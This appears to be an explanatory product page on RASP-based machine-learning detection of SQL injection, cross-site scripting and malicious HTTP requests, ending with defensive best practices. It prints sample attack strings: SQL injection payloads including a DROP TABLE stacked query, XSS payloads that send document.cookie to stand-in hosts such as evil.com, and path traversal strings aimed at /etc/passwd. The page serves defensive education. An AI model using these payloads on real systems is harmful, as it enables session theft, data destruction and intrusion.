What is RASP?

Runtime Application Self-Protection (RASP) is a security technology that monitors application behavior at runtime to detect and prevent real-time attacks. Unlike traditional WAFs (Web Application Firewalls) that operate at the network perimeter, RASP operates inside the application, providing deep visibility and precise threat detection.

RASP works by instrumenting the application code and monitoring how it processes data, executes queries, and interacts with the system. When malicious activity is detected, RASP can immediately block the attack before it causes damage.

Key Features

  • Real-time Detection: Analyze requests as they execute within the application
  • Machine Learning: Adaptive threat detection and pattern recognition
  • Zero-Day Protection: Detect unknown attack vectors through behavioral analysis
  • Behavioral Analysis: Monitor application behavior for anomalies and suspicious patterns
  • Minimal Overhead: Optimized for performance with <10ms response time
  • Comprehensive Logging: Detailed threat intelligence and forensics
  • Context-Aware: Understands application logic and legitimate use cases
  • Adaptive Learning: Continuously learns from new threats and patterns

SQL Injection Detection

SQL Injection attacks occur when attacker-controlled input is incorporated into SQL queries without proper sanitization. This allows attackers to manipulate database queries, extract sensitive data, modify or delete records, and potentially execute system commands.

Our ML model analyzes query patterns, SQL syntax markers, character distributions, and statistical features to detect injection attempts with high precision and minimal false positives.

How SQL Injection Works

Normal Query: SELECT * FROM users WHERE email = 'user@example.com' AND password = 'pass123' Injected Query: SELECT * FROM users WHERE email = 'user@example.com' OR '1'='1' AND password = 'pass123' Result: Returns all users instead of validating credentials

Detection Methods

  • Pattern Matching: Identifies SQL keywords and syntax (UNION, SELECT, DROP, etc.)
  • Entropy Analysis: Detects unusual character distributions in input
  • Behavioral Analysis: Monitors query execution time and result sets
  • Contextual Analysis: Understands expected input format and validates deviations
  • Machine Learning: Ensemble methods detect novel injection techniques

Common SQL Injection Patterns

UNION-Based Injection
Attacker appends UNION SELECT statements to extract data from the database. This technique allows querying additional tables and columns.
' UNION SELECT NULL, username, password FROM users--
Time-Based Blind Injection
Uses database delay functions to infer database contents by measuring response time. Boolean conditions determine the delay.
id=1; WAITFOR DELAY '00:00:05'--
Boolean-Based Blind Injection
Manipulates conditional logic to extract information one bit at a time by observing true/false responses from the application.
id=1' AND '1'='1 (true) vs id=1' AND '1'='2 (false)
Stacked Queries
Executes multiple SQL statements sequentially. Can modify schema, insert malicious data, or execute system commands depending on database permissions.
id=1; DROP TABLE users; SELECT * FROM accounts--
Error-Based Injection
Deliberately triggers database errors to extract information from error messages. Useful for identifying database version and structure.
id=1 AND extractvalue(0x0a, concat(0x7e, version()))--
Second-Order Injection
Malicious payload is stored in database and executed later when retrieved. Harder to detect because payload is legitimate when stored.
Stored in database, executed when user views their profile or data

Cross-Site Scripting (XSS) Detection

Cross-Site Scripting (XSS) attacks inject malicious scripts into web pages viewed by other users. Attackers can steal session cookies, perform unauthorized actions, deface websites, or redirect users to malicious sites.

Our ML model detects XSS payloads by analyzing HTML/JavaScript patterns, encoding anomalies, script execution indicators, and behavioral signatures to identify both reflected and stored XSS attacks.

Types of XSS Attacks

  • Reflected XSS: Malicious script is reflected back to the attacker's browser in a response
  • Stored XSS: Malicious payload is stored in the database and executed for all users
  • DOM-Based XSS: Vulnerability exists in client-side JavaScript logic
  • Blind XSS: Payload is stored but execution is not immediately observable

Common Payloads

Direct Script: <script>alert('XSS')</script> Event Handler: <img src=x onerror="alert('XSS')"> JavaScript Protocol: <a href="javascript:alert('XSS')">Click me</a> Data Exfiltration: <img src=x onerror="fetch('http://evil.com?c='+document.cookie)">

Test XSS Detection

XSS Attack Variants

Reflected XSS
Injected script is immediately returned in the server's response. Typically delivered via URL parameter or form submission.
<img src=x onerror="fetch('//evil.com?c='+document.cookie)">
Stored XSS
Malicious payload is stored in the database and executed every time the page is viewed by any user who accesses that content.
<script>fetch('//attacker.com/steal?data='+document.cookie)</script>
DOM-Based XSS
Vulnerability exists in client-side JavaScript logic when handling user input. Server never processes the malicious data.
javascript:void(eval('document.location="//evil.com"'))
Encoded XSS
Uses various encoding techniques (HTML entities, Unicode, Base64) to bypass security filters while remaining executable.
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
SVG-Based XSS
Uses SVG elements and event handlers to execute JavaScript. Often bypasses filters that focus on traditional HTML tags.
<svg onload="alert('XSS')"></svg>
Attribute-Based XSS
Injects code through HTML attributes using event handlers or attribute-based techniques to execute JavaScript.
<input onfocus="alert('XSS')" autofocus>

Malicious HTTP Request Detection

Beyond specific attack types like SQL Injection and XSS, our ML model analyzes complete HTTP requests to detect anomalous behavior, including suspicious header combinations, encoding anomalies, protocol abuse, and behavioral indicators of compromise.

The detection engine examines request timing, payload characteristics, HTTP method usage, header correlations, and user behavior patterns to identify reconnaissance activities and attack preparation.

What Makes a Request Suspicious?

  • Unusual Headers: Malformed or unexpected HTTP headers
  • Encoding Anomalies: Double encoding, null bytes, or special characters
  • Protocol Violations: Invalid HTTP methods or malformed requests
  • Size Anomalies: Unusually large payloads or parameters
  • Timing Patterns: Rapid requests or unusual request sequences
  • User-Agent Issues: Known vulnerability scanners or bots
  • Path Traversal: Attempts to access parent directories
  • Parameter Fuzzing: Testing multiple parameters rapidly

HTTP Threat Indicators

Protocol Anomalies
Unusual HTTP versions, invalid methods, or header combinations that violate HTTP specifications or expected application behavior.
Invalid HTTP/1.1 methods | Oversized headers | Missing required headers
Encoding Attacks
Double encoding, null bytes, Unicode escaping, or other encoding tricks used to bypass filters and security controls.
%252e%252e%252f (double URL encoding) | %00 (null bytes)
Path Traversal Indicators
Attempts to access files and directories outside the intended application root directory. Includes various encoding and bypass techniques.
../../etc/passwd | ..\\..\\windows\\system32 | ....//....//
Reconnaissance Patterns
Scanning for vulnerable endpoints, technologies, and configuration. Includes multiple error responses and parameter discovery.
Multiple 404 responses | Parameter fuzzing | Banner grabbing
Bot/Scanner Detection
Identifies known vulnerability scanners, security testing tools, and automated attack frameworks based on user-agent strings and request patterns.
sqlmap | nikto | nmap | masscan | metasploit
Brute Force Patterns
Detects rapid sequential requests to the same endpoint or credential submission endpoints with different payloads.
Rapid login attempts | Multiple authentication failures | Account enumeration

Key Concepts

Runtime Application Self-Protection (RASP)

Security technology that monitors application behavior at runtime and blocks attacks from within the application, providing context-aware threat detection.

Web Application Firewall (WAF)

Network-level security device that inspects HTTP traffic and blocks malicious requests before reaching the application.

Anomaly Detection

Machine learning technique that identifies unusual patterns that deviate from normal behavior, enabling detection of zero-day attacks.

Entropy Analysis

Statistical measure of randomness/disorder in data. High entropy in user input suggests encoded payloads or obfuscation.

Ensemble Learning

Machine learning technique that combines multiple models to improve accuracy and robustness compared to single models.

False Positive Rate

Percentage of legitimate requests incorrectly flagged as threats. Lower rates mean less operational overhead.

Best Practices for Application Security

  • Input Validation: Validate all user input against expected format and length
  • Output Encoding: Encode output based on context (HTML, JavaScript, URL, CSS)
  • Parameterized Queries: Use prepared statements to prevent SQL injection
  • Least Privilege: Run applications with minimum required permissions
  • Security Headers: Implement CSP, X-Frame-Options, X-Content-Type-Options
  • HTTPS/TLS: Encrypt all communication in transit
  • Session Management: Use secure, random session tokens with proper expiration
  • Authentication: Implement MFA and secure password policies
  • Rate Limiting: Implement request rate limiting to prevent brute force attacks
  • Logging & Monitoring: Log all security-relevant events for forensic analysis
